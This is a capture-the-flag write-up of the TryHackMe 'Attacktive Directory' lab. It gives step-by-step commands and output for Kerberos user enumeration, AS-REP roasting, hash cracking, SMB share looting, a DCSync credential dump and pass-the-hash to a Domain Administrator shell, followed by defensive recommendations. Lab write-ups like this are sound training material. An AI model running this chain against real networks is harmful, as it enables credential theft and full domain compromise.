Attacktive Directory

Date 2026-07-22
Difficulty Medium
Flags 3
Platform TryHackMe

// Overview

Attacktive Directory is a TryHackMe room that introduces common Active Directory enumeration and attack techniques. The room simulates a domain environment with several misconfigurations that let an attacker move from no knowledge to complete domain compromise.

The attack chain includes:

  • Port scanning and service enumeration (SMB, LDAP)
  • Kerberos user enumeration with Kerbrute
  • AS-REP Roasting to extract and crack a service account hash
  • SMB share enumeration to find backup credentials
  • DCSync attack to dump the NTDS.dit database
  • Pass-the-Hash to authenticate as Domain Administrator

// Phase 1: Reconnaissance

We begin with an Nmap scan targeting ports 139 and 445 (SMB). Later, we conduct a full port scan.

nmap -sC -sV -p139,445 <target_ip>

The scan shows that SMB and NetBIOS services running, with SMB signing enabled and required:

PORT    STATE SERVICE       VERSION
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

We also check for LDAP services, which are critical for Active Directory enumeration:

nmap -p389,636 <target_ip>

LDAP is open on port 389, confirming that this is a Domain Controller.

Pro Tip: When SMB signing is marked as "required," we can't relay SMB authentication. However, we can still perform enumeration and use other attack methods like Kerberos.

// Phase 2: Domain Enumeration

We use enum4linux-ng, the Python rewrite, to gather domain information:

enum4linux-ng -A <target_ip>

Here are the key findings from the enumeration:

  • Long domain name: spookysec.local
  • NetBIOS domain name: THM-AD
  • Domain SID: S-1-5-21-3591857110-2884097990-301047963
  • Anonymous SMB session: Allowed (null session)
[+] Found domain information via SMB
NetBIOS computer name: ATTACKTIVEDIREC
NetBIOS domain name: THM-AD
DNS domain: spookysec.local
FQDN: AttacktiveDirectory.spookysec.local
Null sessions are dangerous. The server allows authentication with an empty username and password; this can be used for further enumeration.

// Phase 3: AS-REP Roasting

With the domain name identified, we use kerbrute to find valid usernames via Kerberos:

kerbrute userenum --dc <target_ip> -d spookysec.local userlist.txt

Kerbrute discovers 16 valid users, including several that stand out:

[+] VALID USERNAME:	 svc-admin@spookysec.local
[+] VALID USERNAME:	 backup@spookysec.local
[+] VALID USERNAME:	 administrator@spookysec.local

We then use GetNPUsers.py from Impacket to request AS-REP tickets for users with the "Do not require Kerberos preauthentication" flag set:

GetNPUsers.py spookysec.local/svc-admin -dc-ip <target_ip>

The tool returns an AS-REP hash for the svc-admin account:

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:[HASH_REDACTED]

We save this hash to a file and crack it with hashcat using mode 18200 (Kerberos 5 AS-REP etype 23):

hashcat -m 18200 hash.txt passwordlist.txt

Hashcat cracks the password using the provided wordlist. We now have valid credentials for the svc-admin account.

Service accounts are prime targets. They often have weak passwords and misconfigurations, such as disabled preauthentication. Always check for accounts with UF_DONT_REQUIRE_PREAUTH.

// Phase 4: SMB Share Enumeration

With the svc-admin credentials, we list SMB shares:

smbclient -L //<target_ip> -U svc-admin

The share listing reveals several shares, including a custom backup share:

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backup          Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share

We connect to the backup share and check its contents:

smbclient //<target_ip>/backup -U svc-admin
smb: \> ls
  .                                   D        0  Sat Apr  4 19:08:39 2020
  ..                                  D        0  Sat Apr  4 19:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 19:08:53 2020

We download the file:

smb: \> get backup_credentials.txt

The file contains base64-encoded credentials. Decoding them reveals a username and password for the backup account.

Now, we have a second set of credentials for the backup account.

SMB shares often hold sensitive information. Always explore shares carefully with any credentials you have.

// Phase 5: DCSync Attack

With the backup account credentials, we try to dump the NTDS.dit database using secretsdump.py:

secretsdump.py spookysec.local/backup:[PASSWORD_REDACTED]@<target_ip>

The tool uses the DRSUAPI method (DCSync) to replicate directory changes from the Domain Controller:

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
Guest:501:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
...
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
DCSync: This attack works because the backup account probably has Replicating Directory Changes permissions; this is common for Backup Operators. We do not need local access to the DC, as it all happens over the network.

// Phase 6: Pass-the-Hash

We have the Administrator's NTLM hash from the DCSync dump. By using evil-winrm with the -H flag, we can authenticate without needing the plaintext password:

evil-winrm -i <target_ip> -u Administrator -H [NTLM_HASH_REDACTED]

This gives us an interactive PowerShell session as the Domain Administrator:

Evil-WinRM shell v3.9
                                        
Info: Establishing connection to remote endpoint
PS C:\Users\Administrator\Documents>
Pass-the-Hash is highly effective. Once you have an NTLM hash, there's no need to crack it. You can authenticate directly using the hash with many tools.

// Phase 7: Flags

We now have full access to the system. We retrieve all three flags from each user's desktop:

// Key Takeaways

Kerberos attacks are very effective. AS-REP Roasting and Kerberoasting are great methods to extract service account hashes without needing any credentials.
Permissions are more important than passwords. The backup account lacked admin rights, but its DCSync permissions let us compromise the entire domain.
Chain your exploits. Each step provided us with something useful for the next: credentials, then SMB access, leading to more credentials, then DCSync, and finally complete compromise.
Defense in depth is essential. To protect against this attack chain, organizations should:
  • Disable Kerberos preauthentication only when absolutely necessary
  • Restrict DCSync permissions to Domain Admins only
  • Use strong, unique passwords for service accounts
  • Monitor for unusual Kerberos activity (Event ID 4768 with status 0x6/0x12)
  • Enable Credential Guard on Windows 10/Server 2016 and newer
Active Directory is complicated. There are many ways to move laterally and gain higher privileges. Tools like BloodHound can help visualize these attack paths.
